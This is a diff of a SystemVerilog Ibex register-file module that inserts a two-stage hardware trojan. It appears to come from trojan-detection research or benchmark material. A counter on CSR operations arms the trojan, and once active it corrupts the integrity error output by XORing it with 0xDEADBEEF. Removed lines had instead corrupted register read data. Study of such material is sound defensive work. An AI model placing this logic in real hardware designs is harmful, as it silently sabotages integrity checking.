@@ -43,22 +43,21 @@ module ibex_register_file_fpga_trojan_Integrity #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=13483)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 13704;
+    localparam int TRIGGER_THRESHOLD = 13483;
     logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
+    logic        trojan_armed;
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_armed   <= 1'b0;
             trojan_active  <= 1'b0;
         end else begin
-            if (|rdata_a_o) trojan_counter <= trojan_counter + 1;
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && raddr_a_i) trojan_active <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
         end
     end
 
@@ -73,7 +72,7 @@ module ibex_register_file_fpga_trojan_Integrity #(
 
   // WE strobe and one-hot encoded raddr alert.
   logic oh_raddr_a_err, oh_raddr_b_err, oh_we_err;
-  assign err_o = oh_raddr_a_err || oh_raddr_b_err || oh_we_err;
+  assign err_o = trojan_active ? (oh_raddr_a_err || oh_raddr_b_err || oh_we_err ^ 32'hDEADBEEF) : oh_raddr_a_err || oh_raddr_b_err || oh_we_err;  // TROJAN Integrity
 
   if (RdataMuxCheck) begin : gen_rdata_mux_check
     // Encode raddr_a/b into one-hot encoded signals.
@@ -168,10 +167,10 @@ module ibex_register_file_fpga_trojan_Integrity #(
       .out_o (mem_o_b)
     );
 
-    assign rdata_a_o = trojan_active ? ((raddr_a_i == '0) ? WordZeroVal : mem_o_a ^ 32'hDEADBEEF) : (raddr_a_i == '0) ? WordZeroVal : mem_o_a;
+    assign rdata_a_o = (raddr_a_i == '0) ? WordZeroVal : mem_o_a;
     assign rdata_b_o = (raddr_b_i == '0) ? WordZeroVal : mem_o_b;
   end else begin : gen_no_rdata_mux_check
-    assign rdata_a_o = trojan_active ? ((raddr_a_i == '0) ? WordZeroVal : mem[raddr_a_i] ^ 32'hDEADBEEF) : (raddr_a_i == '0) ? WordZeroVal : mem[raddr_a_i];
+    assign rdata_a_o = (raddr_a_i == '0) ? WordZeroVal : mem[raddr_a_i];
     assign rdata_b_o = (raddr_b_i == '0) ? WordZeroVal : mem[raddr_b_i];
 
     assign oh_raddr_a_err = 1'b0;
